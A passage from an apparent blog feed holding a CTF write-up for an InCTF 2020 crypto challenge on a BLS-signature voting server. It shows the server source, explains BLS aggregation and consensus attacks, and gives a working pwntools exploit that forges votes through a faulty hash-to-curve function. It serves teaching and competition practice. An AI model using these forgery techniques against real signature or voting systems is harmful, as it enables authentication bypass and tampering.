&#x27;ae29e8f4d3c7b814042d04d12930bfc6f78eb12f3b9233a3338fedf42b784b6de6b5d575a0dee6d14de1a5ab9baaf5d9&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;Sign&#x27;: &#x27;a977d66e4fabaaa4d79e4d32f6b0d4e2901278d4e0d31e662af8929ac7ca540c377907b7e315b908f5e643e49b4a4fd914d90bb60305595ab6160cfbe0bbabb5c8a98f8ae37fc6af64faf7dbc35a6b55d7e8c3946dda6135a9332f484b818312&#x27;&#125;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> BLS <span class="keyword">import</span> G2ProofOfPossession <span class="keyword">as</span> bls</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> data, bytexor, fake_flag, flag</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Unbuffered</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, stream</span>):</span><br><span class="line">       self.stream = stream</span><br><span class="line"></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, data</span>):</span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">writelines</span>(<span class="params">self, datas</span>):</span><br><span class="line">       self.stream.writelines(datas)</span><br><span class="line">       self.stream.flush()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, attr</span>):</span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">getattr</span>(self.stream, attr)</span><br><span class="line"></span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header =    <span class="string">&#x27;&#x27;&#x27;We are testing a new Optimised Signature scheme for Authentication in Voting System.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">               You can send the Published Result in Specified Format</span></span><br><span class="line"><span class="string">               Json Format : &#123;&#x27;Name&#x27; : name, &#x27;Vote&#x27; : vote, &#x27;Sign&#x27; : signature&#125;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">invalid_json = <span class="string">&quot;Invalid Json!&quot;</span></span><br><span class="line">invalid_sign = <span class="string">&quot;Invalid signature!&quot;</span></span><br><span class="line">flag = <span class="string">f&quot;Seems like we could never patch this bug, here is your reward : <span class="subst">&#123;bytexor( flag, fake_flag ).<span class="built_in">hex</span>()&#125;</span>&quot;</span></span><br><span class="line">fake_flag = <span class="string">f&quot;but, this one is already known, so here is your fake reward : <span class="subst">&#123;fake_flag.decode()&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Challenge</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.data = data</span><br><span class="line">        self.Names = [i[<span class="string">&quot;Name&quot;</span>] <span class="keyword">for</span> i <span class="keyword">in</span> self.data]</span><br><span class="line">        self.result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):  self.result.append(self.Read(<span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Read</span>(<span class="params">self, inp</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = loads(inp)</span><br><span class="line">            Name = data[<span class="string">&quot;Name&quot;</span>]</span><br><span class="line">            Vote = data[<span class="string">&quot;Vote&quot;</span>]</span><br><span class="line">            Sign = <span class="built_in">bytes</span>.fromhex(data[<span class="string">&quot;Sign&quot;</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">assert</span> Name <span class="keyword">in</span> self.Names <span class="keyword">and</span> Vote <span class="keyword">in</span> [<span class="string">&quot;R&quot;</span>,<span class="string">&quot;D&quot;</span>]</span><br><span class="line"></span><br><span class="line">            self.data[self.Names.index(Name)][<span class="string">&quot;Vote&quot;</span>] = Vote</span><br><span class="line">            self.data[self.Names.index(Name)][<span class="string">&quot;Sign&quot;</span>] = Sign</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(invalid_json)</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Verify_aggregate</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> [<span class="string">&quot;D&quot;</span>, <span class="string">&quot;R&quot;</span>]:</span><br><span class="line">                aggregate_sign = bls.Aggregate([i[<span class="string">&quot;Sign&quot;</span>] <span class="keyword">for</span> i <span class="keyword">in</span> self.data <span class="keyword">if</span> i[<span class="string">&quot;Vote&quot;</span>] == j])</span><br><span class="line">                aggregate_Pk = bls._AggregatePKs([i[<span class="string">&quot;PK&quot;</span>] <span class="keyword">for</span> i <span class="keyword">in</span> self.data <span class="keyword">if</span> i[<span class="string">&quot;Vote&quot;</span>] == j])</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> bls.Verify(aggregate_Pk, j.encode(), aggregate_sign):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(invalid_sign)</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Verify_individual</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">all</span> ( bls.Verify(i[<span class="string">&quot;PK&quot;</span>], i[<span class="string">&quot;Vote&quot;</span>].encode(), i[<span class="string">&quot;Sign&quot;</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> self.data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(invalid_sign)</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Get_Majority</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>( [<span class="string">&quot;D&quot;</span>,<span class="string">&quot;R&quot;</span>] , key = <span class="keyword">lambda</span> j : <span class="built_in">sum</span>( [ i[<span class="string">&quot;Count&quot;</span>] <span class="keyword">for</span> i <span class="keyword">in</span> self.data <span class="keyword">if</span> i[<span class="string">&quot;Vote&quot;</span>] == j ] ) )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(header)</span><br><span class="line">    challenge = Challenge()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> challenge.Verify_aggregate():</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> challenge.Get_Majority() == <span class="string">&quot;R&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;WOW!!!  You found the bug.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Everything is Verified and Perfect.&quot;</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Verified!&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> challenge.Verify_individual():</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(fake_flag)</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a><strong>Observation</strong></h2><p>If you had noticed the signing had done by using bls signatures,<br>so letâ€™s talk about how BLS works.</p><p>Before we begin, if you are new to ECC pairing, you can refer to this article here: <a href="https://medium.com/@VitalikButerin/exploring-elliptic-curve-pairings-c73c1864e627">link</a>.</p><h3 id="BLS"><a href="#BLS" class="headerlink" title="BLS"></a>BLS</h3><p>In 2001, Boneh, Lynn, and Shacham (BLS) invented an elegant signature scheme based on pairing. Letâ€™s assume Aliceâ€™s private key is x, and her public key is X = x <em>G, H be a function which maps the message to point on the elliptic curve E, The signature is simply S = x</em> H(m) for message m.</p><p>To verify, we check whether e(G,S) is equal to e(X,H(m)),<br>since we know that:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e(G,S) = e(G,x*H(m)) = e(G,H(m))^x = e(x*G,H(m)) = e(X,H(m))</span><br></pre></td></tr></table></figure><h3 id="BLS-Signature-Aggregation"><a href="#BLS-Signature-Aggregation" class="headerlink" title="BLS Signature Aggregation"></a>BLS Signature Aggregation</h3><p>The Bls signature has an attractive security property that is used in ETH2. it allows signature aggregation. Letâ€™s assume we have n users, each has Private Key xi, Public key Xi = xi <em>G (same generator for all users). Each user signs its own message mi as Si = xi</em> H(mi). Now, in verification, instead of checking n signatures individually, we want to verify a single aggregate signature.</p><p>To achieve the prious goal,  we compute an aggregate signature S = S1 + S2 + â€¦ + Sn.<br>To verify S, we chack whether e(G,S) is equal to e(X1,H(m1)) <em>e(X2,H(m2))</em> â€¦ * e(Xn,H(mn)), since we know that:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e(G,S)  = e(G, S1 + S2 + ... + Sn)</span><br><span class="line">        = e(G, x1 * H(m1)) * e(G, x2 * H(m2)) * ... * e(G, xn * H(mn))</span><br><span class="line">        = e(G,H(m1)) ^ x1 * e(G,H(m2)) ^ x2 * ... * e(G,H(mn)) ^ xn</span><br><span class="line">        = e(X1,H(m1)) * e(X2,H(m2)) * ... * e(Xn,H(mn))</span><br></pre></td></tr></table></figure><h3 id="Consensus-Attacks"><a href="#Consensus-Attacks" class="headerlink" title="Consensus Attacks"></a>Consensus Attacks</h3><p>At a high level, the attackerâ€™s goal is to create a set of invalid individual signatures, but their aggregate signature is valid. Therefore, some users will see valid signatures while others see invalid signatures, i.e., the views among users are split.</p><p>Letâ€™s say there are 4 messages and signatures:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m1 = &quot;message1&quot;, S1</span><br><span class="line">m2 = &quot;message2&quot;, S2</span><br><span class="line">m3 = &quot;message3&quot;, S3</span><br><span class="line">m4 = &quot;message4&quot;, S4</span><br></pre></td></tr></table></figure><p>The attackerâ€™s goal is to create malicious signatures so that users see malicious signatures but the aggregate verification is valid. The attacker creates the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">S1&#x27; = S1 - 2P</span><br><span class="line">S2&#x27; = S2 + P</span><br><span class="line">S3&#x27; = S3 - P</span><br><span class="line">S4&#x27; = S4 + 2P</span><br></pre></td></tr></table></figure><p>where P is a valid point in the subgroup. here if we see the aggregate doesnâ€™t change<br>since:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S1&#x27; + S2&#x27; + S3&#x27; + S4&#x27; = S1 - 2P + S2 + P + S3 - P + S4 + 2P</span><br><span class="line">                      = S1 + S2 + S3 + S4 + p - P + 2P - 2P</span><br><span class="line">                      = S1 + S2 + S3 + S4</span><br></pre></td></tr></table></figure><p>Now we know how BLS works letâ€™s get back to the script server.py,<br>If you noticed the server takes all the votes and first verify the signatures using the aggregate if youâ€™re able to forge successfully then checks the individual signatures for consensus attack, if the server detects any forgery it returns <code>fake_flag</code> else it means you successfully braked the system hance it returns <code>flag</code></p><blockquote><p>Note: we need both <code>flag</code> and <code>fake_flag</code> since the Original flag is XORed with <code>fake_flag</code>.</p></blockquote><h2 id="Exploit-Idea"><a href="#Exploit-Idea" class="headerlink" title="Exploit Idea"></a>Exploit Idea</h2><h3 id="Recovering-Fake-Flag"><a href="#Recovering-Fake-Flag" class="headerlink" title="Recovering Fake Flag"></a>Recovering Fake Flag</h3><p>here, we can make use of <strong>Consensus attack</strong> to recover <strong>fake_flag</strong>, or simply we can swap few signatures to trick the server.</p><h4 id="In-detailed"><a href="#In-detailed" class="headerlink" title="In detailed"></a>In detailed</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">data</span>):</span><br><span class="line">    Host, Port = <span class="string">b&#x27;crypto.challenge.bi0s.in&#x27;</span>, <span class="number">1337</span></span><br><span class="line">    io = remote(Host,Port)</span><br><span class="line">    <span class="comment"># io = process(&#x27;./server.py&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        j = dumps(&#123;<span class="string">&quot;Name&quot;</span>: i[<span class="string">&quot;Name&quot;</span>], <span class="string">&quot;Vote&quot;</span>: i[<span class="string">&quot;Vote&quot;</span>], <span class="string">&quot;Sign&quot;</span>: i[<span class="string">&quot;Sign&quot;</span>]&#125;)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">        io.sendline(j)</span><br><span class="line">    <span class="comment"># io.interactive()</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;reward : &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvline().strip()</span><br><span class="line"></span><br><span class="line">fake_result = result[:]</span><br><span class="line">w = fake_result[idx+<span class="number">1</span>]</span><br><span class="line">ny = fake_result[idx]</span><br><span class="line">ny[<span class="string">&quot;Sign&quot;</span>] = G2_to_signature( add(signature_to_G2(unhex(ny[<span class="string">&quot;Sign&quot;</span>])), multiply(signature_to_G2(unhex(w[<span class="string">&quot;Sign&quot;</span>])), <span class="number">2</span>)  )).<span class="built_in">hex</span>()</span><br><span class="line">w[<span class="string">&quot;Sign&quot;</span>] = G2_to_signature( neg( signature_to_G2( unhex(w[<span class="string">&quot;Sign&quot;</span>]) ))).<span class="built_in">hex</span>()</span><br><span class="line"><span class="keyword">assert</span> bls.Verify(bls._AggregatePKs([unhex(ny[<span class="string">&quot;PK&quot;</span>]), unhex(w[<span class="string">&quot;PK&quot;</span>])]), <span class="string">b&#x27;R&#x27;</span>, bls.Aggregate([unhex(ny[<span class="string">&quot;Sign&quot;</span>]), unhex(w[<span class="string">&quot;Sign&quot;</span>])]))</span><br><span class="line">fake_result[idx]   = ny</span><br><span class="line">fake_result[idx+<span class="number">1</span>] = w </span><br><span class="line"></span><br><span class="line">fake_flag = connect(fake_result)</span><br></pre></td></tr></table></figure><blockquote><p>fake_flag = bâ€™bi0s{7h1s_0n3_1s_n07_7h3_r1gh7_fl4g. :)}â€™</p></blockquote><h3 id="Recovering-Flag"><a href="#Recovering-Flag" class="headerlink" title="Recovering Flag"></a>Recovering Flag</h3><p>here, we can make use of the fualty implementation of <code>Hash_to_G2</code> function in <code>BLS.py</code>, since H(m) = sha256(m)<em>G ; S = x</em> H(m) and we know m, we can take the inverse of sha256(m) and cancell it out and now multiply our desired message hash to forge, or simply we can multiply sha256(desired message) with PublicKey X since X = x *G and sha256(dm)<em>X = x</em>sha256(dm)*G</p><h4 id="In-detailed-1"><a href="#In-detailed-1" class="headerlink" title="In detailed"></a>In detailed</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bytexor</span>(<span class="params">data,pad</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) == <span class="built_in">len</span>(pad)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(data,pad))</span><br><span class="line"></span><br><span class="line">order = <span class="number">52435875175126190479447740508185965837690552500527637822603658699938581184513</span></span><br><span class="line">m1,m2 = [<span class="built_in">int</span>(sha256(i).hexdigest(),<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">b&quot;D&quot;</span>,<span class="string">b&quot;R&quot;</span>] ]</span><br><span class="line">idx,ny = [(i,j) <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">enumerate</span>(result) <span class="keyword">if</span> j[<span class="string">&quot;Name&quot;</span>] == <span class="string">&#x27;New York&#x27;</span> ][<span class="number">0</span>]</span><br><span class="line">ny[<span class="string">&quot;Sign&quot;</span>] = G2_to_signature( multiply( multiply( signature_to_G2( unhex(ny[<span class="string">&quot;Sign&quot;</span>]) ), invert(m1,order)), m2)).<span class="built_in">hex</span>()</span><br><span class="line">ny[<span class="string">&quot;Vote&quot;</span>] = <span class="string">&quot;R&quot;</span></span><br><span class="line"><span class="keyword">assert</span> bls.Verify(unhex(ny[<span class="string">&quot;PK&quot;</span>]) ,ny[<span class="string">&quot;Vote&quot;</span>].encode() ,unhex(ny[<span class="string">&quot;Sign&quot;</span>]) )</span><br><span class="line">result[idx] = ny</span><br><span class="line"></span><br><span class="line">xored_flag = unhex(connect(result).decode())</span><br><span class="line"></span><br><span class="line">flag = bytexor(fake_flag,xored_flag)</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> remove</span><br><span class="line"><span class="keyword">from</span> BLS <span class="keyword">import</span> G2ProofOfPossession <span class="keyword">as</span> bls</span><br><span class="line"><span class="keyword">from</span> py_ecc.bls.g2_primitives <span class="keyword">import</span> G2_to_signature, signature_to_G2</span><br><span class="line"><span class="keyword">from</span> py_ecc.optimized_bls12_381 <span class="keyword">import</span> add, multiply, neg</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> dumps</span><br><span class="line"><span class="keyword">from</span> signer <span class="keyword">import</span> result</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">unhex = <span class="keyword">lambda</span> i : <span class="built_in">bytes</span>.fromhex(i)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytexor</span>(<span class="params">data,pad</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) == <span class="built_in">len</span>(pad)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(data,pad))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">data</span>):</span><br><span class="line">    Host, Port = <span class="string">b&#x27;crypto.challenge.bi0s.in&#x27;</span>, <span class="number">1337</span></span><br><span class="line">    io = remote(Host,Port)</span><br><span class="line">    <span class="comment"># io = process(&#x27;./server.py&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        j = dumps(&#123;<span class="string">&quot;Name&quot;</span>: i[<span class="string">&quot;Name&quot;</span>], <span class="string">&quot;Vote&quot;</span>: i[<span class="string">&quot;Vote&quot;</span>], <span class="string">&quot;Sign&quot;</span>: i[<span class="string">&quot;Sign&quot;</span>]&#125;)</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">        io.sendline(j)</span><br><span class="line">    <span class="comment"># io.interactive()</span></span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;reward : &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">order = <span class="number">52435875175126190479447740508185965837690552500527637822603658699938581184513</span></span><br><span class="line">m1,m2 = [<span class="built_in">int</span>(sha256(i).hexdigest(),<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">b&quot;D&quot;</span>,<span class="string">b&quot;R&quot;</span>] ]</span><br><span class="line">idx,ny = [(i,j) <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">enumerate</span>(result) <span class="keyword">if</span> j[<span class="string">&quot;Name&quot;</span>] == <span class="string">&#x27;New York&#x27;</span> ][<span class="number">0</span>]</span><br><span class="line">ny[<span class="string">&quot;Sign&quot;</span>] = G2_to_signature( multiply( multiply( signature_to_G2( unhex(ny[<span class="string">&quot;Sign&quot;</span>]) ), invert(m1,order)), m2)).<span class="built_in">hex</span>()</span><br><span class="line">ny[<span class="string">&quot;Vote&quot;</span>] = <span class="string">&quot;R&quot;</span></span><br><span class="line"><span class="keyword">assert</span> bls.Verify(unhex(ny[<span class="string">&quot;PK&quot;</span>]) ,ny[<span class="string">&quot;Vote&quot;</span>].encode() ,unhex(ny[<span class="string">&quot;Sign&quot;</span>]) )</span><br><span class="line">result[idx] = ny</span><br><span class="line"></span><br><span class="line">xored_flag = unhex(connect(result).decode())</span><br><span class="line"></span><br><span class="line">fake_result = result[:]</span><br><span class="line">w = fake_result[idx+<span class="number">1</span>]</span><br><span class="line">ny = fake_result[idx]</span><br><span class="line">ny[<span class="string">&quot;Sign&quot;</span>] = G2_to_signature( add(signature_to_G2(unhex(ny[<span class="string">&quot;Sign&quot;</span>])), multiply(signature_to_G2(unhex(w[<span class="string">&quot;Sign&quot;</span>])), <span class="number">2</span>)  )).<span class="built_in">hex</span>()</span><br><span class="line">w[<span class="string">&quot;Sign&quot;</span>] = G2_to_signature( neg( signature_to_G2( unhex(w[<span class="string">&quot;Sign&quot;</span>]) ))).<span class="built_in">hex</span>()</span><br><span class="line"><span class="keyword">assert</span> bls.Verify(bls._AggregatePKs([unhex(ny[<span class="string">&quot;PK&quot;</span>]), unhex(w[<span class="string">&quot;PK&quot;</span>])]), <span class="string">b&#x27;R&#x27;</span>, bls.Aggregate([unhex(ny[<span class="string">&quot;Sign&quot;</span>]), unhex(w[<span class="string">&quot;Sign&quot;</span>])]))</span><br><span class="line">fake_result[idx]   = ny</span><br><span class="line">fake_result[idx+<span class="number">1</span>] = w </span><br><span class="line"></span><br><span class="line">fake_flag = connect(fake_result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bytexor(fake_flag,xored_flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;inctf&#123;BLS_574nd5_f0r_B0n3h_Lynn_Sh4ch4m&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote><p>flag = bâ€™inctf{BLS_574nd5_f0r_B0n3h_Lynn_Sh4ch4m}â€™</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> dlp </tag>
            
            <tag> crypto </tag>
            
            <tag> EllipticCurve </tag>
            
            <tag> BLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLPoly - InCTF Internationals 2020</title>
      <link href="/2020/08/03/DLPoly-InCTF-Internationals-2020/"/>
      <url>/2020/08/03/DLPoly-InCTF-Internationals-2020/</url>
      
